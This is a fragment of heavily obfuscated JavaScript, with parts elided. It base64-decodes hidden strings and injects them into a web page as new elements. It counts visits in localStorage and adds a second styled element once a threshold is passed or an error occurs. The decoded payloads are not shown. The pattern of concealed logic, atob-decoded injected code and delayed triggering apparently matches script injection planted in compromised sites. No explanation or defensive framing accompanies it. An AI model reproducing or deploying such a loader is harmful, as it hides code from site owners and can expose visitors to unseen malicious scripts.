...
(function (c, d) {
    ...
    while (!![]) {
        try {
            const f = parseInt(q(0x1f4)) / 0x1 * (parseInt(q(0x1e7)) / 0x2) + -parseInt(q(0x204)) / 0x3 + -parseInt(q(0x1f2)) / 0x4 * (-parseInt(q(0x20d)) / 0x5) + parseInt(q(0x202)) / 0x6 + -parseInt(q(0x1ec)) / 0x7 + parseInt(q(0x1fa)) / 0x8 + -parseInt(q(0x1ed)) / 0x9;
            if (f === d)
                break;
            else
                e['push'](e['shift']());
    ...
    function f() {
        const s = r, h = c[s(0x1f7)], i = c[s(0x1e8)](atob, h), j = document[s(0x1f9)](c[s(0x1e9)]);
        j[s(0x201)] = i, document[s(0x1f5)][s(0x1f0)](j);
    }
    function g() {
        const t = r;
        try {
            let i = c[t(0x1ff)](parseInt, localStorage[t(0x1ee)](e) || '0', 0xa);
            i++, localStorage[t(0x1f3)](e, i[t(0x200)]());
            if (c[t(0x1f6)](i, d)) {
                c[t(0x1ef)](f);
                const j = c[t(0x208)], k = c[t(0x1e6)](atob, j), l = document[t(0x1f9)](c[t(0x20a)]);
                l[t(0x1f1)] = k, l[t(0x20e)][t(0x1eb)] = c[t(0x1fc)], document[t(0x203)][t(0x1f0)](l);
            }
        } catch (m) {
            c[t(0x1fb)](f);
            const n = c[t(0x208)], o = c[t(0x1e6)](atob, n), p = document[t(0x1f9)](c[t(0x20a)]);
            p[t(0x1f1)] = o, p[t(0x20e)][t(0x1eb)] = c[t(0x1fc)], document[t(0x203)][t(0x1f0)](p);
        }
    }
    document[r(0x203)] ? c[r(0x206)](g) : document[r(0x1f8)](c[r(0x207)], g);
}()));
function a() {
    const u = [
        'ZIoSf',
